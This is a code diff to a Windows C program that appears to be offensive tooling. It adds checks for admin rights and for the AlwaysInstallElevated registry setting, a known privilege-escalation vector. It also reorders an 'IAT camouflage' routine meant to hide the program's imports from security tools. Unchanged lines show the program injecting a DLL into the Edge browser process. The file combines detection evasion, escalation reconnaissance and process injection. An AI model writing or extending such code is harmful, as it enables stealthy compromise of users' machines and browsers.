@@ -2,6 +2,95 @@
 #include <Windows.h>
 #include <tlhelp32.h>
 
+// Function to check if the process is running with admin privileges
+BOOL IsRunningAsAdmin() {
+	BOOL isAdmin = FALSE;
+	PSID adminGroup = NULL;
+
+	// Allocate and initialize a SID for the administrators group.
+	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+	if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
+		printf("[!] AllocateAndInitializeSid Failed With Error Code: %d\n", GetLastError());
+		return FALSE;
+	}
+
+	// Check if the token of the calling thread is a member of the administrators group.
+	if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
+		printf("[!] CheckTokenMembership Failed With Error Code: %d\n", GetLastError());
+		isAdmin = FALSE;
+	}
+
+	// Free the SID.
+	if (adminGroup) {
+		FreeSid(adminGroup);
+	}
+
+	return isAdmin;
+}
+
+// Fucntion to check whether HKCU AlwaysInstallElevated is enabled
+BOOL CheckHKCUAlwaysInstallElevated(){
+	HKEY        hKey = NULL;
+	BOOL        bResult = FALSE;
+	LSTATUS     STATUS = 0x00;
+	DWORD       dwKeyValue = 0x01,
+		dwKeyValueSize = sizeof(DWORD);
+	
+	//Open the registry key to check the value of AlwaysInstallElevated
+	if ((STATUS = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\Installer", 0, KEY_QUERY_VALUE, &hKey)) != ERROR_SUCCESS) {
+		goto _END_OF_FUNC;
+	}
+
+	//Query the value of AlwaysInstallElevated
+	if ((STATUS = RegQueryValueExW(hKey, L"AlwaysInstallElevated", NULL, NULL, &dwKeyValue, &dwKeyValueSize)) != ERROR_SUCCESS) {
+		printf("[!] RegQueryValueEx Failed With Error: %d\n", STATUS);
+		goto _END_OF_FUNC;
+	}
+
+	//Check if the value is set to 1
+	if (dwKeyValue == 1) {
+		bResult = TRUE;
+	}
+
+_END_OF_FUNC:
+	if (hKey)
+		RegCloseKey(hKey);
+	return bResult;
+
+}
+
+// Function to check whether HKLM AlwaysInstallElevated is enabled
+BOOL CheckHKLMAlwaysInstallElevated() {
+	HKEY        hKey = NULL;
+	BOOL        bResult = FALSE;
+	LSTATUS     STATUS = 0x00;
+	DWORD       dwKeyValue = 0x01,
+		dwKeyValueSize = sizeof(DWORD);
+
+	// Open the registry key to check the value of AlwaysInstallElevated
+	if ((STATUS = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Policies\\Microsoft\\Windows\\Installer", 0, KEY_QUERY_VALUE, &hKey)) != ERROR_SUCCESS) {
+		goto _END_OF_FUNC;
+	}
+
+	//Query the value of AlwaysInstallElevated
+	if ((STATUS = RegQueryValueExW(hKey, L"AlwaysInstallElevated", NULL, NULL, &dwKeyValue, &dwKeyValueSize)) != ERROR_SUCCESS) {
+		printf("[!] RegQueryValueEx Failed With Error: %d\n", STATUS);
+		goto _END_OF_FUNC;
+	}
+
+	//Check if the value is set to 1
+	if (dwKeyValue == 1) {
+		bResult = TRUE;
+	}
+
+_END_OF_FUNC:
+	if (hKey)
+		RegCloseKey(hKey);
+	return bResult;
+
+}
+
 // Function to add Whitelisted APIs to camouflage IAT
 VOID IATCamoflage2() {
 	ULONG_PTR uAddress = NULL;
@@ -147,6 +236,21 @@ _EndOfFunction:
 
 int main() {
 
+	// Checking if the program is running with admin privileges
+	if (IsRunningAsAdmin()) {
+		printf("[+] The program is running with admin privileges.\n");
+	}
+	else {
+		if (!(CheckHKCUAlwaysInstallElevated() || CheckHKLMAlwaysInstallElevated())) {
+			printf("[!] The program is not running with admin privileges.\n");
+			printf("[i] AlwaysInstallElevated is not enabled in the registry\n");
+		}
+		
+	}
+
+	// Camoflage the IAT
+	IATCamoflage2();
+
 	// Hardcoded process name
 	wchar_t szProcessName[] = L"msedge.exe";
 
@@ -187,9 +291,6 @@ int main() {
 	}
 
 	printf("[+] DLL injected successfully\n");
-
-	// Camoflage the IAT
-	IATCamoflage2();
 
 	// Close the handle to the process
 	CloseHandle(hProcess);
